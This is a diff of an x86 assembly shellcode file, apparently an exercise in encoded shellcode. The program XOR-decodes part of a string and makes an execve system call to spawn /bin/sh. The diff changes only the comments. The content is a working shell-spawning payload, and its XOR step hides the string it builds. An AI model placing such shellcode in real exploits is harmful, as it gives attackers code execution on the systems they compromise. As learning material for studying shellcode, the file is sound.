@@ -2,8 +2,8 @@
 global _start
 
 _start:
-    xor eax, eax            ;initialize eax to NULL
-    push eax                ;Push NULL on the stack
+    xor eax, eax            ;Initialize eax to NULL
+    push eax                ;Push a NULL Byte on the stack
     
     mov edx, 0xb6de91c0     ;Move 0xb6de91c0 into edx 
     xor edx, 0xdeadbeef     ;Xor 0xb6de91c0 with 0xdeadbeef
@@ -13,12 +13,13 @@ _start:
 
     push 0x1                ;Push 0x1 on the stack
     pop ecx                 ;Pop 0x1 inside ecx
-    dec ecx                 ;dec ecx by one
-    xor edx, edx            ;initialize edx to NULL
+    dec ecx                 ;Decrement ecx by one
+                            ;Initialize ecx to NULL
+    xor edx, edx            ;Initialize edx to NULL
 
     push 0xb                ;Push 0xb on the stack
     pop eax                 ;Pop the execve systemcall number inside eax 
 
     ;Systemcall details:
     ; --> execve("/bin/sh%00", NULL, NULL);
-    int 0x80                ;execute systemcall 
+    int 0x80                ;Execute systemcall 
